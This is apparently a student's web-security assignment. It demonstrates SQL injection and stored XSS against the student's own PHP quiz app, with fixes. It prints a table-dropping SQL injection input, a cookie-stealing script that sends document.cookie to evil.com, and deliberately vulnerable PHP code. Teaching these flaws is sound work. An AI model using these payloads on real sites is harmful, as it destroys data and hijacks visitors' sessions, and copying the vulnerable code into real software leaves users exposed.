# Break It Exercise — Quiz 3 (D4)
**hernac7 | ITWS 1100**

---

## Vulnerability 1 — SQL Injection

### The Vulnerable Code

This is a modified version of `save-score.php` where I replaced the prepared statement with raw string concatenation:

```php
// VULNERABLE — do NOT use this
$player_name = $_POST["name"];
$score       = $_POST["score"];
$total       = $_POST["total"];

$sql = "INSERT INTO quiz_scores (player_name, score, total, played_at)
        VALUES ('" . $player_name . "', " . $score . ", " . $total . ", NOW())";

$conn->query($sql);
```

### The Exploit

If someone opens their browser's dev tools and fires a POST request with this as the `name` value:

```
', 0, 0, NOW()); DROP TABLE quiz_scores; --
```

The SQL string that actually gets executed becomes:

```sql
INSERT INTO quiz_scores (player_name, score, total, played_at)
VALUES ('', 0, 0, NOW()); DROP TABLE quiz_scores; --', ...)
```

That's two statements. The first INSERT runs fine. The second drops the entire `quiz_scores` table. Everything stored there is gone. The `--` at the end comments out whatever was left of the original query so MySQL doesn't throw a syntax error.

### The Safe Version

```php
// SAFE — from the actual save-score.php
$stmt = $conn->prepare(
    "INSERT INTO quiz_scores (player_name, score, total, played_at)
     VALUES (?, ?, ?, NOW())"
);
$stmt->bind_param("sii", $player_name, $score, $total);
$stmt->execute();
```

The `?` placeholders tell MySQL the structure of the query before any data arrives. When `bind_param()` fills in the values, MySQL treats them as pure data — it's not possible for the input to break out of its slot and become SQL. Even if someone types `'; DROP TABLE quiz_scores; --` into the name field, MySQL stores that exact string as text. Nothing gets executed.

---

## Vulnerability 2 — XSS (Cross-Site Scripting)

### The Vulnerable Code

Imagine I added a leaderboard to `index.php` that reads player names back out of the database and prints them to the page. Here's the unsafe version:

```php
// VULNERABLE — do NOT use this
$stmt = $conn->prepare("SELECT player_name, score, total FROM quiz_scores ORDER BY score DESC LIMIT 10");
$stmt->execute();
$result = $stmt->get_result();

while ($row = $result->fetch_assoc()) {
    // Printing raw user input directly into HTML — dangerous
    echo "<tr><td>" . $row["player_name"] . "</td><td>" . $row["score"] . "/" . $row["total"] . "</td></tr>";
}
```

### The Exploit

A user sets their name to this when starting the quiz:

```
<script>alert('hacked')</script>
```

That string gets saved to the database. When the leaderboard renders and PHP echoes it raw into the HTML, the browser doesn't see text — it sees a script tag and executes it. Every single person who visits the leaderboard page gets the alert popup.

In a real attack this wouldn't be an `alert()`. It would be something like:

```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

That silently ships the visitor's session cookie to an attacker's server. Anyone logged in gets their session hijacked.

### The Fix

```php
// SAFE — escape all user-generated content before printing it to HTML
echo "<tr><td>" . htmlspecialchars($row["player_name"], ENT_QUOTES, "UTF-8") . "</td>
          <td>" . (int)$row["score"] . "/" . (int)$row["total"] . "</td></tr>";
```

`htmlspecialchars()` converts `<` to `&lt;` and `>` to `&gt;`, so the browser renders the characters as visible text instead of interpreting them as HTML tags. The script tag shows up on screen as literal text, not executable code. Casting `score` and `total` to `int` makes sure those columns can never contain anything other than a number.

---
